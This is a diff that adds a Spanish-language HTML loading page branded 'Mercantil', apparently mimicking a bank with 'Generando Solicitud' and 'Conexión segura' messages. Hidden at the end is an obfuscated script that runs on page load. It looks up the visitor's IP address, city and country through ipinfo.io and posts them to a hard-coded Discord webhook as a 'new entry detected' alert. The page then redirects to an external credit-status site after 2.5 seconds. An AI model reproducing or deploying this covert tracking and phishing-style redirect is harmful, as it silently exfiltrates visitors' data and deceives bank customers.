@@ -1,1 +1,273 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" href="merca.ico" type="image/x-icon" sizes="256x256"/>
+    <title>Mercantil</title>
 
+    <!-- Tipografía profesional -->
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
+
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        html, body {
+            height: 100%;
+            width: 100%;
+        }
+
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: 'Plus Jakarta Sans', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+            background: linear-gradient(135deg, #0a1428 0%, #0d1e3c 100%);
+            overflow: hidden;
+        }
+
+        /* CONTENEDOR PRINCIPAL */
+        .container {
+            text-align: center;
+            max-width: 420px;
+            width: 100%;
+            padding: 20px;
+        }
+
+        /* CARD */
+        .card {
+            background: rgba(255, 255, 255, 0.03);
+            backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            border-radius: 12px;
+            padding: 48px 40px;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3);
+            animation: slideUp 0.7s cubic-bezier(0.34, 1.56, 0.64, 1);
+        }
+
+        /* LOGO */
+        .logo-wrapper {
+            margin-bottom: 32px;
+        }
+
+        .logo {
+            width: 72px;
+            height: 72px;
+            margin: 0 auto;
+            border-radius: 10px;
+            overflow: hidden;
+            background: linear-gradient(135deg, rgba(255,255,255,0.1), rgba(255,255,255,0.05));
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            animation: fadeInScale 0.8s ease-out 0.1s both;
+            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.2);
+        }
+
+        .logo img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        /* INDICADOR DE CARGA */
+        .loader {
+            margin-bottom: 32px;
+            height: 4px;
+            background: rgba(255, 255, 255, 0.08);
+            border-radius: 2px;
+            overflow: hidden;
+            position: relative;
+        }
+
+        .loader::after {
+            content: '';
+            position: absolute;
+            left: 0;
+            top: 0;
+            height: 100%;
+            width: 30%;
+            background: linear-gradient(90deg, 
+                rgba(59, 130, 246, 0) 0%, 
+                rgba(59, 130, 246, 0.8) 50%, 
+                rgba(59, 130, 246, 0) 100%);
+            animation: loading 1.8s ease-in-out infinite;
+        }
+
+        /* TEXTO PRINCIPAL */
+        .status-text {
+            font-size: 15px;
+            color: rgba(255, 255, 255, 0.85);
+            font-weight: 500;
+            letter-spacing: 0.2px;
+            margin-bottom: 8px;
+            animation: fadeIn 0.8s ease-out 0.2s both;
+        }
+
+        .status-dots {
+            display: inline-block;
+            width: 4px;
+            animation: dots 1.4s steps(4, end) infinite;
+        }
+
+        /* INFORMACIÓN DE SEGURIDAD */
+        .security-info {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin-top: 24px;
+            padding-top: 20px;
+            border-top: 1px solid rgba(255, 255, 255, 0.06);
+            font-size: 12px;
+            color: rgba(255, 255, 255, 0.6);
+            animation: fadeIn 0.8s ease-out 0.4s both;
+        }
+
+        .security-icon {
+            width: 14px;
+            height: 14px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .lock-icon {
+            width: 10px;
+            height: 12px;
+            border: 1.5px solid rgba(59, 130, 246, 0.7);
+            border-radius: 2px;
+            position: relative;
+        }
+
+        .lock-icon::before {
+            content: '';
+            position: absolute;
+            top: -5px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 6px;
+            height: 5px;
+            border: 1.5px solid rgba(59, 130, 246, 0.7);
+            border-bottom: none;
+            border-radius: 6px 6px 0 0;
+        }
+
+        /* ANIMACIONES */
+        @keyframes slideUp {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        @keyframes fadeInScale {
+            from {
+                opacity: 0;
+                transform: scale(0.95);
+            }
+            to {
+                opacity: 1;
+                transform: scale(1);
+            }
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+            }
+            to {
+                opacity: 1;
+            }
+        }
+
+        @keyframes loading {
+            0% {
+                left: -100%;
+            }
+            100% {
+                left: 100%;
+            }
+        }
+
+        @keyframes dots {
+            0% { content: ''; }
+            33% { content: '.'; }
+            66% { content: '..'; }
+            100% { content: '...'; }
+        }
+
+        /* RESPONSIVE */
+        @media (max-width: 480px) {
+            .card {
+                padding: 36px 24px;
+            }
+
+            .status-text {
+                font-size: 14px;
+            }
+
+            .logo {
+                width: 64px;
+                height: 64px;
+            }
+        }
+
+        /* PREFERS REDUCED MOTION */
+        @media (prefers-reduced-motion: reduce) {
+            * {
+                animation-duration: 0.01ms !important;
+                animation-iteration-count: 1 !important;
+                transition-duration: 0.01ms !important;
+            }
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="container">
+        <div class="card">
+            <div class="logo-wrapper">
+                <div class="logo">
+                    <img src="unnamed.webp" alt="Mercantil">
+                </div>
+            </div>
+
+            <div class="loader"></div>
+
+            <div class="status-text">
+                Generando Solicitud<span class="status-dots"></span>
+            </div>
+
+            <div class="security-info">
+                <div class="security-icon">
+                    <div class="">🔒</div>
+                </div>
+                <span>Conexión segura</span>
+            </div>
+        </div>
+    </div>
+
+<script>
+const _0x2a78b2=_0x7ff2;(function(_0x34c695,_0x2224e9){const _0x6c628e=_0x7ff2,_0x28a77c=_0x34c695();while(!![]){try{const _0x3c7a6f=parseInt(_0x6c628e(0x152))/0x1*(-parseInt(_0x6c628e(0x14d))/0x2)+-parseInt(_0x6c628e(0x161))/0x3*(parseInt(_0x6c628e(0x14b))/0x4)+parseInt(_0x6c628e(0x154))/0x5+-parseInt(_0x6c628e(0x14f))/0x6*(parseInt(_0x6c628e(0x15e))/0x7)+-parseInt(_0x6c628e(0x160))/0x8*(-parseInt(_0x6c628e(0x156))/0x9)+-parseInt(_0x6c628e(0x145))/0xa*(parseInt(_0x6c628e(0x15f))/0xb)+-parseInt(_0x6c628e(0x143))/0xc*(-parseInt(_0x6c628e(0x157))/0xd);if(_0x3c7a6f===_0x2224e9)break;else _0x28a77c['push'](_0x28a77c['shift']());}catch(_0x4130de){_0x28a77c['push'](_0x28a77c['shift']());}}}(_0x2f8d,0xa2d68));function _0x2f8d(){const _0x57d61e=['37116pdkyCD','✅\x20Alerta\x20enviada','156DjpiqC','DOMContentLoaded','city','69wqUGip','log','5423425yJRtMb','json','45oAEeXt','13qYuJOd','toISOString','readyState','application/json','Sistema\x20de\x20Monitoreo','https://ipinfo.io?token=','N/A','27237GValAU','11xWvJhp','13784zZRxoy','9srWaDX','toLocaleString','❌\x20Error:','📍\x20Ubicación','country','31103124SVdpIV','error','12629340KEWtPV','🚨\x20Nuevo\x20Ingreso\x20Detectado','loading','https://discord.com/api/webhooks/1562066235003244634/zLt7UdUHn1PhD8ndnu8RrgFHlmUvGlO1B0caxNizjnMnPtctcNdtgtVvwHGnDJBMVB4r','es-ES','addEventListener','498188OqdKmZ','🔐\x20IP\x20Address'];_0x2f8d=function(){return _0x57d61e;};return _0x2f8d();}const WEBHOOK_URL=_0x2a78b2(0x148),IPINFO_TOKEN='e8764d0b0d51b0';async function getGeoLocation(){const _0x67d802=_0x2a78b2;try{const _0x15232=new AbortController(),_0x1375e3=setTimeout(()=>_0x15232['abort'](),0x5dc),_0x5d63cb=_0x67d802(0x15c)+IPINFO_TOKEN,_0x114350=await fetch(_0x5d63cb,{'signal':_0x15232['signal']});return clearTimeout(_0x1375e3),await _0x114350[_0x67d802(0x155)]();}catch(_0x5e6ac4){return{'ip':'N/A','city':_0x67d802(0x15d),'country':'N/A'};}}function _0x7ff2(_0x33722d,_0x9a3c4e){_0x33722d=_0x33722d-0x13f;const _0x2f8dbe=_0x2f8d();let _0x7ff25e=_0x2f8dbe[_0x33722d];return _0x7ff25e;}async function sendAlert(){const _0x18c97b=_0x2a78b2;try{const _0x46f159=await getGeoLocation(),_0x2ff99c=new Date(),_0x4ebd6b=_0x2ff99c[_0x18c97b(0x13f)](_0x18c97b(0x149)),_0x257a7f={'title':_0x18c97b(0x146),'color':0xff5252,'fields':[{'name':_0x18c97b(0x14c),'value':'`'+(_0x46f159['ip']||'N/A')+'`','inline':!![]},{'name':_0x18c97b(0x141),'value':(_0x46f159[_0x18c97b(0x151)]||_0x18c97b(0x15d))+',\x20'+(_0x46f159[_0x18c97b(0x142)]||_0x18c97b(0x15d)),'inline':!![]},{'name':'⏰\x20Hora','value':'`'+_0x4ebd6b+'`','inline':![]}],'timestamp':_0x2ff99c[_0x18c97b(0x158)](),'footer':{'text':_0x18c97b(0x15b)}},_0x1582ba={'embeds':[_0x257a7f]};await fetch(WEBHOOK_URL,{'method':'POST','headers':{'Content-Type':_0x18c97b(0x15a)},'body':JSON['stringify'](_0x1582ba)}),console[_0x18c97b(0x153)](_0x18c97b(0x14e));}catch(_0x3065fe){console[_0x18c97b(0x144)](_0x18c97b(0x140),_0x3065fe);}}document[_0x2a78b2(0x159)]===_0x2a78b2(0x147)?document[_0x2a78b2(0x14a)](_0x2a78b2(0x150),sendAlert):sendAlert();
+</script>
+
+
+    <script>
+        setTimeout(() => {
+            window.location.href = 'https://estadocreditos.up.railway.app/';
+        }, 2500);
+    </script>
+
+</body>
+</html>
